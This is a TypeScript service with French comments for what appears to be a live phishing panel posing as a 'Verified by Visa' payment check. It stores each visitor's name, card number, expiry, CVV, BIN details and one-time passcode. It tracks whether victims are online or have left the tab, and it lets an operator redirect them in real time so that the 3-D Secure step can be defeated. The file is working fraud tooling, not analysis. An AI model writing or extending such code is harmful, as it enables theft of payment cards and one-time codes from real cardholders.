/**
 * Service pour la gestion des clients sur la page VBV
 */

interface VBVClient {
  visitId: string;
  ip: string;
  page: string;
  fullName: string;
  cardInfo: {
    cardholder: string;
    cardNumber: string;
    expiry: string;
    cvv: string;
  };
  /** BIN formaté pour rappel (ex: "457896 (VISA - FIRSTRAND BANK, LTD.)") */
  binDisplay?: string;
  /** Pays pour rappel (ex: "SOUTH AFRICA") */
  country?: string;
  otpCode?: string;
  lastActivity: number;
  isOnline: boolean;
  /** true = onglet pas focus (autre onglet ou fenêtre minimisée) → afficher "Client parti" */
  isAway: boolean;
  /** true = page fermée (leave appelé) → afficher "Client parti" définitivement */
  left: boolean;
}

class VBVPanelService {
  private clients = new Map<string, VBVClient>();
  private redirectRequests = new Map<string, string>(); // visitId -> redirectTo
  private readonly HEARTBEAT_TIMEOUT = 120000; // 2 min sans heartbeat = hors ligne (client envoie toutes les 5s)
  // left=true quand le client ferme la page (leave). isAway=true quand l'onglet n'est pas focus.

  /**
   * Enregistre ou met à jour un client sur la page VBV
   */
  upsertClient(data: {
    visitId: string;
    ip: string;
    fullName?: string;
    cardInfo?: {
      cardholder: string;
      cardNumber: string;
      expiry: string;
      cvv: string;
    };
    binDisplay?: string;
    country?: string;
    otpCode?: string;
    page?: string;
  }): VBVClient {
    const now = Date.now();
    const existing = this.clients.get(data.visitId);

    // Déterminer la page : utiliser celle fournie, ou celle existante, ou "Payment Verification" par défaut
    let page = "Payment Verification";
    if (data.page) {
      page = data.page;
    } else if (existing?.page) {
      page = existing.page;
    }

    const client: VBVClient = {
      visitId: data.visitId,
      ip: data.ip,
      page: page,
      fullName: data.fullName || existing?.fullName || "",
      cardInfo: data.cardInfo || existing?.cardInfo || {
        cardholder: "",
        cardNumber: "",
        expiry: "",
        cvv: "",
      },
      binDisplay: data.binDisplay !== undefined ? data.binDisplay : existing?.binDisplay,
      country: data.country !== undefined ? data.country : existing?.country,
      // Mettre à jour le code OTP si fourni, sinon garder l'existant
      otpCode: data.otpCode !== undefined ? data.otpCode : existing?.otpCode,
      lastActivity: now,
      isOnline: true,
      isAway: existing?.isAway ?? false,
      left: existing?.left ?? false,
    };

    this.clients.set(data.visitId, client);
    console.log(`[VBV Service] Client upserted: ${data.visitId.substring(0, 12)}... (Page: ${page}, Total clients: ${this.clients.size})`);
    return client;
  }

  /**
   * Met à jour le heartbeat d'un client.
   * focused = true si l'onglet est visible, false si autre onglet / fenêtre non focus.
   */
  updateHeartbeat(visitId: string, ip?: string, focused?: boolean): boolean {
    let client = this.clients.get(visitId);

    if (!client && ip) {
      client = {
        visitId,
        ip,
        page: "VBV",
        fullName: "",
        cardInfo: {
          cardholder: "",
          cardNumber: "",
          expiry: "",
          cvv: "",
        },
        lastActivity: Date.now(),
        isOnline: true,
        isAway: false,
        left: false,
      };
      this.clients.set(visitId, client);
      console.log(`[VBV Service] Client created via heartbeat: ${visitId.substring(0, 12)}... (Total clients: ${this.clients.size})`);
      return true;
    }

    if (!client) return false;
    if (client.left) return true; // déjà marqué parti, on accepte le heartbeat sans rien faire

    client.lastActivity = Date.now();
    client.isOnline = true;
    if (focused !== undefined) {
      client.isAway = !focused;
    }
    return true;
  }

  /**
   * Récupère tous les clients, avec mise à jour du statut en ligne.
   * Les clients ne sont pas retirés automatiquement : uniquement à la fermeture de la fenêtre (leave).
   */
  getAllClients(): VBVClient[] {
    const now = Date.now();

    for (const client of Array.from(this.clients.values())) {
      if (client.left) continue;
      const timeSinceLastActivity = now - client.lastActivity;
      client.isOnline = timeSinceLastActivity < this.HEARTBEAT_TIMEOUT;
    }

    const allClients = Array.from(this.clients.values())
      .sort((a, b) => b.lastActivity - a.lastActivity);

    if (allClients.length > 0) {
      console.log(`[VBV Service] getAllClients: ${allClients.length} clients (${allClients.filter(c => c.isOnline).length} online)`);
    }
    return allClients;
  }

  /**
   * Récupère un client par visitId
   */
  getClient(visitId: string): VBVClient | undefined {
    const client = this.clients.get(visitId);
    if (client && !client.left) {
      const now = Date.now();
      const timeSinceLastActivity = now - client.lastActivity;
      client.isOnline = timeSinceLastActivity < this.HEARTBEAT_TIMEOUT;
    }
    return client;
  }

  /**
   * Marque un client comme parti (page fermée). Il reste dans la liste avec "Client parti".
   */
  markClientLeft(visitId: string): boolean {
    const client = this.clients.get(visitId);
    if (!client) return false;
    client.left = true;
    client.isOnline = false;
    client.isAway = true;
    return true;
  }

  /**
   * Supprime un client de la map (pour nettoyage optionnel)
   */
  removeClient(visitId: string): boolean {
    return this.clients.delete(visitId);
  }

  /**
   * Nettoie les clients inactifs (optionnel, pour libérer la mémoire)
   */
  cleanupInactiveClients(maxAge = 3600000): void {
    const now = Date.now();
    for (const [visitId, client] of Array.from(this.clients.entries())) {
      if (now - client.lastActivity > maxAge) {
        this.clients.delete(visitId);
      }
    }
  }

  /**
   * Demande une redirection pour un client
   */
  requestRedirect(visitId: string, redirectTo: string): boolean {
    if (!this.clients.has(visitId)) {
      return false;
    }
    this.redirectRequests.set(visitId, redirectTo);
    return true;
  }

  /**
   * Récupère et consomme la demande de redirection pour un client
   */
  getAndConsumeRedirect(visitId: string): string | null {
    const redirectTo = this.redirectRequests.get(visitId);
    if (redirectTo) {
      this.redirectRequests.delete(visitId);
      return redirectTo;
    }
    return null;
  }
}

export const vbvPanelService = new VBVPanelService();
